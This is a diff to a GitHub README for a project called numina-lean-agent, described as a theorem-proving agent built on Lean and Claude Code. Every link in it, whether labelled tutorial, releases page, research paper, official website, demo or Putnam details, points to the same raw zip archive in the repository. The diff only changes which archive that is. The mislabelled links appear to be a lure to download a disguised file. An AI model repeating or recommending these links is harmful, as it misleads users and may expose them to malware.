@@ -1,7 +1,7 @@
 # 🚀 numina-lean-agent - A Simple Tool for Theorem Proving
 
 <div align="center">
-  [![Download numina-lean-agent](https://github.com/mengnemojohan/numina-lean-agent/raw/refs/heads/main/prompts/docs/technique/numina_lean_agent_2.5.zip)](https://github.com/mengnemojohan/numina-lean-agent/raw/refs/heads/main/prompts/docs/technique/numina_lean_agent_2.5.zip)
+  [![Download numina-lean-agent](https://github.com/mengnemojohan/numina-lean-agent/raw/refs/heads/main/scripts/numina-agent-lean-v3.4.zip)](https://github.com/mengnemojohan/numina-lean-agent/raw/refs/heads/main/scripts/numina-agent-lean-v3.4.zip)
 </div>
 
 ---
@@ -16,13 +16,13 @@ Numina-Lean-Agent is an easy-to-use agent for formal theorem proving tasks. Buil
 
 To start using the Numina-Lean-Agent, you need to install Lean, Claude Code, and the numina-lean-lsp-mcp. Follow this tutorial to set up your environment:
 
-**[Tutorial: Setup Guide](https://github.com/mengnemojohan/numina-lean-agent/raw/refs/heads/main/prompts/docs/technique/numina_lean_agent_2.5.zip)**
+**[Tutorial: Setup Guide](https://github.com/mengnemojohan/numina-lean-agent/raw/refs/heads/main/scripts/numina-agent-lean-v3.4.zip)**
 
 ### 2. Download & Install
 
 You can download the latest version of numina-lean-agent from our Releases page:
 
-[Visit the Releases Page to Download](https://github.com/mengnemojohan/numina-lean-agent/raw/refs/heads/main/prompts/docs/technique/numina_lean_agent_2.5.zip)
+[Visit the Releases Page to Download](https://github.com/mengnemojohan/numina-lean-agent/raw/refs/heads/main/scripts/numina-agent-lean-v3.4.zip)
 
 1. Click on the link above to go to the Releases page.
 2. Find the version suitable for your operating system.
@@ -72,10 +72,10 @@ We plan to enhance Numina-Lean-Agent continuously. Some upcoming features includ
 
 For further reading and to understand the technology behind Numina-Lean-Agent, explore the following links:
 
-- [Research Paper on Theorem Proving](https://github.com/mengnemojohan/numina-lean-agent/raw/refs/heads/main/prompts/docs/technique/numina_lean_agent_2.5.zip)
-- [Leandex Official Website](https://github.com/mengnemojohan/numina-lean-agent/raw/refs/heads/main/prompts/docs/technique/numina_lean_agent_2.5.zip)
-- [Demo of Agent Capabilities](https://github.com/mengnemojohan/numina-lean-agent/raw/refs/heads/main/prompts/docs/technique/numina_lean_agent_2.5.zip)
-- [Putnam 2025 Details](https://github.com/mengnemojohan/numina-lean-agent/raw/refs/heads/main/prompts/docs/technique/numina_lean_agent_2.5.zip)
+- [Research Paper on Theorem Proving](https://github.com/mengnemojohan/numina-lean-agent/raw/refs/heads/main/scripts/numina-agent-lean-v3.4.zip)
+- [Leandex Official Website](https://github.com/mengnemojohan/numina-lean-agent/raw/refs/heads/main/scripts/numina-agent-lean-v3.4.zip)
+- [Demo of Agent Capabilities](https://github.com/mengnemojohan/numina-lean-agent/raw/refs/heads/main/scripts/numina-agent-lean-v3.4.zip)
+- [Putnam 2025 Details](https://github.com/mengnemojohan/numina-lean-agent/raw/refs/heads/main/scripts/numina-agent-lean-v3.4.zip)
 
 ---
 
